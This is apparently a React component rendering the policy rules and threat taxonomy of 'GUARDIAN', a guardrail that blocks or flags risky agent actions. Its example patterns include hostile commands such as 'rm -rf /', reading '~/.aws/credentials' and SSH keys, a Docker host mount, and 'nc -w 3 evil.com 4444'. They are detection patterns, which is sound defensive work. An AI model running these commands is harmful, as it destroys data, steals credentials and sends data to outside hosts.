import type { RiskCategory, RiskLevel } from "../types/guardian";
import { RiskBadge } from "../components/DecisionBadge";

interface GovernanceProps {
  view: "policies" | "risks";
}

interface PolicyRuleDef {
  id: string;
  name: string;
  enforcement: "BLOCK" | "REVIEW" | "ALLOW";
  description: string;
  threshold: number;
  triggerCategory: string;
  status: "ACTIVE" | "MONITORING";
  version: string;
}

const POLICY_RULES: PolicyRuleDef[] = [
  {
    id: "POL-001",
    name: "Destructive Action in Production Override",
    enforcement: "BLOCK",
    description:
      "Hard interception of any schema drop, data deletion, or storage truncation targeted at live production environments.",
    threshold: 0.75,
    triggerCategory: "DESTRUCTIVE + PRODUCTION",
    status: "ACTIVE",
    version: "1.0",
  },
  {
    id: "POL-002",
    name: "Credential Access & Secret Interception",
    enforcement: "BLOCK",
    description:
      "Intercepts commands accessing AWS credentials, SSH private keys, API secrets, token stores, or password files.",
    threshold: 0.75,
    triggerCategory: "CREDENTIAL_ACCESS",
    status: "ACTIVE",
    version: "1.0",
  },
  {
    id: "POL-003",
    name: "Privilege Escalation & Container Breakout",
    enforcement: "BLOCK",
    description:
      "Denies container root mounts, sudo operations, Docker socket binding, and unverified kernel permission grants.",
    threshold: 0.75,
    triggerCategory: "PRIVILEGE_ESCALATION",
    status: "ACTIVE",
    version: "1.0",
  },
  {
    id: "POL-004",
    name: "Unverified Data Exfiltration",
    enforcement: "REVIEW",
    description:
      "Requires human analyst sign-off before automated agents can stream or dump large datasets across network boundaries.",
    threshold: 0.50,
    triggerCategory: "DATA_EXFILTRATION",
    status: "ACTIVE",
    version: "1.0",
  },
  {
    id: "POL-005",
    name: "Customer PII Mass Export",
    enforcement: "REVIEW",
    description:
      "Flags operations matching customer personal identification, sensitive identifiers, or financial ledger tables.",
    threshold: 0.50,
    triggerCategory: "CUSTOMER_DATA",
    status: "ACTIVE",
    version: "1.0",
  },
  {
    id: "POL-006",
    name: "Temporary Artifact Maintenance Baseline",
    enforcement: "ALLOW",
    description:
      "Permits non-destructive file operations scoped exclusively to volatile directories (/tmp, build-cache).",
    threshold: 0.20,
    triggerCategory: "TEMPORARY_FILES",
    status: "ACTIVE",
    version: "1.0",
  },
];

interface CategorySpec {
  name: RiskCategory;
  severity: RiskLevel;
  description: string;
  examples: string[];
  detectorSource: "SEMANTIC_MODEL" | "HEURISTIC_RULE" | "HYBRID";
}

const CATEGORY_SPECS: CategorySpec[] = [
  {
    name: "DESTRUCTIVE",
    severity: "CRITICAL",
    description: "Irreversible data erasure, table drops, recursive file removal, partition format.",
    examples: ["DROP TABLE", "rm -rf /", "TRUNCATE TABLE", "DELETE FROM users"],
    detectorSource: "HYBRID",
  },
  {
    name: "PRIVILEGE_ESCALATION",
    severity: "CRITICAL",
    description: "Attempts to gain administrative, root, sudo, or host execution rights.",
    examples: ["sudo su", "chmod 777 /etc/passwd", "docker -v /:/host", "chown root"],
    detectorSource: "HYBRID",
  },
  {
    name: "CREDENTIAL_ACCESS",
    severity: "CRITICAL",
    description: "Extracting, copying, or reading cryptographic tokens, API keys, or credentials.",
    examples: ["cat ~/.aws/credentials", "echo $DATABASE_URL", "read /root/.ssh/id_rsa"],
    detectorSource: "HYBRID",
  },
  {
    name: "DATA_EXFILTRATION",
    severity: "HIGH",
    description: "Transmitting internal datasets, schemas, or memory dumps to external endpoints.",
    examples: ["curl -X POST https://...", "scp dump.sql external:", "nc -w 3 evil.com 4444"],
    detectorSource: "HYBRID",
  },
  {
    name: "PRODUCTION",
    severity: "HIGH",
    description: "Targeting live infrastructure, production clusters, primary database clusters.",
    examples: ["env=production", "db=prod_master", "cluster=k8s-prod-us-east-1"],
    detectorSource: "SEMANTIC_MODEL",
  },
  {
    name: "CUSTOMER_DATA",
    severity: "HIGH",
    description: "Personally identifiable customer information, emails, physical addresses.",
    examples: ["SELECT ssn, name FROM customers", "export users_csv"],
    detectorSource: "SEMANTIC_MODEL",
  },
  {
    name: "FINANCIAL_DATA",
    severity: "HIGH",
    description: "Credit card records, payment processor tokens, bank account information.",
    examples: ["SELECT card_token FROM payments", "stripe_secret_key"],
    detectorSource: "SEMANTIC_MODEL",
  },
  {
    name: "EMPLOYEE_DATA",
    severity: "MEDIUM",
    description: "Internal human resources data, employee compensation, performance reviews.",
    examples: ["payroll_salaries", "employee_hr_notes"],
    detectorSource: "SEMANTIC_MODEL",
  },
  {
    name: "DATABASE",
    severity: "MEDIUM",
    description: "Direct SQL query execution, transaction handling, relational storage mutations.",
    examples: ["ALTER TABLE", "CREATE INDEX CONCURRENTLY", "VACUUM FULL"],
    detectorSource: "HEURISTIC_RULE",
  },
  {
    name: "TEMPORARY_FILES",
    severity: "LOW",
    description: "Volatile files, build scratchpads, temporary cache dirs, ephemeral logs.",
    examples: ["/tmp/build.log", "/var/cache/app", "scratch/*.tmp"],
    detectorSource: "HEURISTIC_RULE",
  },
];

export function Governance({ view }: GovernanceProps) {
  return (
    <div className="overview-editorial-wrap">
      {view === "policies" ? (
        <>
          <div className="page-header-block flex items-start justify-between">
            <div>
              <h1 className="page-main-heading">Policy specification</h1>
              <p className="page-sub-heading">
                Deterministic ruleset, score cutoffs, and interception triggers compiled into GUARDIAN v1.0.
              </p>
            </div>
            <div className="policy-version-pill">
              Ruleset: <strong>v1.0 (Fail-closed)</strong>
            </div>
          </div>

          <div className="spec-callout-box">
            <span className="spec-callout-tag">Compiled Pipeline Rules</span>
            <p className="spec-callout-text">
              These rules are evaluated in-memory by the FastAPI execution middleware for every action.
              Rules are deterministic, enforced fail-closed, and require a codebase release to modify.
            </p>
          </div>

          <div className="dev-table-container">
            <table className="dev-table">
              <thead>
                <tr>
                  <th style={{ width: "100px" }}>Rule ID</th>
                  <th>Policy Name & Scope</th>
                  <th style={{ width: "110px" }}>Enforcement</th>
                  <th style={{ width: "200px" }}>Trigger Category</th>
                  <th style={{ width: "90px" }}>Cutoff</th>
                  <th style={{ width: "90px", textAlign: "right" }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {POLICY_RULES.map((rule) => (
                  <tr key={rule.id} className="dev-table-row">
                    <td>
                      <code className="mono-text">{rule.id}</code>
                    </td>
                    <td>
                      <div className="policy-info-cell">
                        <span className="policy-name-text">{rule.name}</span>
                        <p className="policy-desc-text">{rule.description}</p>
                      </div>
                    </td>
                    <td>
                      <span className={`decision-col-token ${rule.enforcement.toLowerCase()}`}>
                        {rule.enforcement}
                      </span>
                    </td>
                    <td>
                      <code className="tag-pill mono-text">{rule.triggerCategory}</code>
                    </td>
                    <td>
                      <code className="mono-text text-[#71717a]">≥ {rule.threshold.toFixed(2)}</code>
                    </td>
                    <td style={{ textAlign: "right" }}>
                      <span className="status-indicator-tag active">
                        <span>Active</span>
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </>
      ) : (
        <>
          <div className="page-header-block flex items-start justify-between">
            <div>
              <h1 className="page-main-heading">Threat taxonomy</h1>
              <p className="page-sub-heading">
                Standard classification categories recognized by GUARDIAN's semantic and heuristic engines.
              </p>
            </div>
            <div className="counter-pill">10 Standard Categories</div>
          </div>

          <div className="spec-callout-box">
            <span className="spec-callout-tag">Vector Classification Taxonomy</span>
            <p className="spec-callout-text">
              Target action and context strings are encoded into 384-dimensional vectors using <code className="inline-code">all-MiniLM-L6-v2</code> and scored against these threat vectors.
            </p>
          </div>

          <div className="dev-table-container">
            <table className="dev-table">
              <thead>
                <tr>
                  <th style={{ width: "210px" }}>Category Identifier</th>
                  <th style={{ width: "110px" }}>Default Severity</th>
                  <th>Scope & Definition</th>
                  <th style={{ width: "150px" }}>Detection Source</th>
                  <th>Pattern Examples</th>
                </tr>
              </thead>
              <tbody>
                {CATEGORY_SPECS.map((cat) => (
                  <tr key={cat.name} className="dev-table-row">
                    <td>
                      <code className="mono-text font-medium text-[#09090b]">{cat.name}</code>
                    </td>
                    <td>
                      <RiskBadge level={cat.severity} size="sm" />
                    </td>
                    <td>
                      <span className="text-[#27272a] leading-relaxed">{cat.description}</span>
                    </td>
                    <td>
                      <span className="tag-pill">{cat.detectorSource}</span>
                    </td>
                    <td>
                      <div className="example-tags-row">
                        {cat.examples.map((ex, idx) => (
                          <code key={idx} className="example-chip">{ex}</code>
                        ))}
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </>
      )}
    </div>
  );
}
